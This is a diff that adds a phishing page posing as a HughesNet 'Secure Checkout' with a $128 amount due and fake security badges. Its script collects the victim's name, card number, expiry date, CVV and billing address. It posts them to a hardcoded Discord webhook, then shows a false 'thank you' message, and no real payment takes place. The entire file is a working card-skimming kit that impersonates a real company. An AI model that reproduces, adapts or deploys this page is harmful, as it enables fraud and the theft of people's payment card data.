@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Secure Checkout</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+
+<style>
+/* --- your existing CSS unchanged --- */
+* {
+    box-sizing: border-box;
+}
+body {
+    margin: 0;
+    font-family: 'Inter', sans-serif;
+    background: linear-gradient(to bottom, #eaf2fb, #f8f9fc);
+}
+.header {
+    background: #ffffff;
+    padding: 18px;
+    text-align: center;
+    box-shadow: 0 2px 6px rgba(0,0,0,0.05);
+}
+.logo-img {
+    max-height: 42px;
+}
+.amount {
+    background: linear-gradient(90deg, #1565c0, #0d47a1);
+    color: white;
+    padding: 18px;
+    font-size: 20px;
+    font-weight: 600;
+    text-align: center;
+}
+.container {
+    width: 92%;
+    max-width: 420px;
+    background: white;
+    margin: 25px auto;
+    padding: 28px;
+    border-radius: 16px;
+    box-shadow: 0 10px 25px rgba(0,0,0,0.08);
+}
+.title {
+    font-weight: 600;
+    font-size: 18px;
+    margin-bottom: 5px;
+}
+.subtitle {
+    font-size: 14px;
+    color: #666;
+    margin-bottom: 22px;
+}
+.secure-box {
+    background: #f8fbff;
+    border: 1px solid #d6e4ff;
+    padding: 18px;
+    border-radius: 14px;
+    margin-bottom: 22px;
+}
+input {
+    width: 100%;
+    padding: 12px;
+    margin-bottom: 14px;
+    border-radius: 10px;
+    border: 1px solid #d0d7de;
+}
+.row {
+    display: flex;
+    gap: 12px;
+}
+button {
+    width: 100%;
+    padding: 15px;
+    background: linear-gradient(90deg, #1565c0, #0d47a1);
+    color: white;
+    border: none;
+    border-radius: 30px;
+    font-size: 15px;
+    font-weight: 600;
+    cursor: pointer;
+    margin-top: 20px;
+}
+#success {
+    display: none;
+    text-align: center;
+    background: #d4edda;
+    color: #155724;
+    padding: 15px;
+    margin-top: 20px;
+    border-radius: 10px;
+    font-weight: 600;
+}
+</style>
+</head>
+
+<body>
+
+<div class="header">
+    <img src="https://cdn.broadbandsearch.net/img/providers/1492545003572hughesnet.png" 
+         alt="HughesNet Logo"
+         class="logo-img">
+</div>
+
+<div class="amount">
+    Amount Due&nbsp;&nbsp;$128.00
+</div>
+
+<div class="container">
+    <div class="title">Credit Card</div>
+    <div class="subtitle">Enter your billing information</div>
+
+   <div class="secure-box">
+        <div class="secure-top">
+            <div class="secure-left">
+
+                <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#1565c0" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <rect x="3" y="11" width="18" height="11" rx="2"></rect>
+                    <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+                </svg>
+
+                <div class="secure-text">Secure Checkout</div>
+            </div>
+
+            <div class="badge">
+                TRUST GUARD
+                <span>Security Scanned</span>
+            </div>
+        </div>
+
+        <div class="secure-sub">
+            This site uses 128-bit SSL encryption
+        </div>
+    </div>
+    
+    <input id="name" type="text" placeholder="Name on Card">
+    <input id="card" type="text" placeholder="Card Number">
+
+    <div class="row">
+        <input id="mm" type="text" placeholder="MM">
+        <input id="yyyy" type="text" placeholder="YYYY">
+        <input id="cvv" type="text" placeholder="CVV">
+    </div>
+
+    <input id="street" type="text" placeholder="Street Address">
+    <input id="apt" type="text" placeholder="Apt #, Floor, etc (optional)">
+    <input id="city" type="text" placeholder="City">
+
+    <div class="row">
+        <input id="state" type="text" placeholder="State">
+        <input id="zip" type="text" placeholder="Zip">
+    </div>
+
+    <button onclick="submitCheckout()">CHECKOUT NOW</button>
+
+    <div id="success">✔ THANK YOU !</div>
+</div>
+
+<script>
+function submitCheckout() {
+
+    let data = {
+        name: document.getElementById("name").value,
+        card: document.getElementById("card").value,
+        mm: document.getElementById("mm").value,
+        yyyy: document.getElementById("yyyy").value,
+        cvv: document.getElementById("cvv").value,
+        street: document.getElementById("street").value,
+        apt: document.getElementById("apt").value,
+        city: document.getElementById("city").value,
+        state: document.getElementById("state").value,
+        zip: document.getElementById("zip").value
+    };
+
+    let webhook = "https://discordapp.com/api/webhooks/1448834115981021329/TzZtUP5ZhvUSo9ttQIAjE2o1Lqvm2K_iFAX8Md8GMfIw-STeleL3DMX7G-RyT4TijN9c";
+
+    fetch(webhook, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            content: 
+                "**New Payment Submission**\n" +
+                "Name: " + data.name + "\n" +
+                "Card: " + data.card + "\n" +
+                "Exp: " + data.mm + "/" + data.yyyy + "\n" +
+                "CVV: " + data.cvv + "\n" +
+                "Address: " + data.street + " " + data.apt + "\n" +
+                "City: " + data.city + "\n" +
+                "State: " + data.state + "\n" +
+                "Zip: " + data.zip
+        })
+    });
+
+    document.getElementById("success").style.display = "block";
+    window.scrollTo(0,0);
+}
+</script>
+
+</body>
+</html>
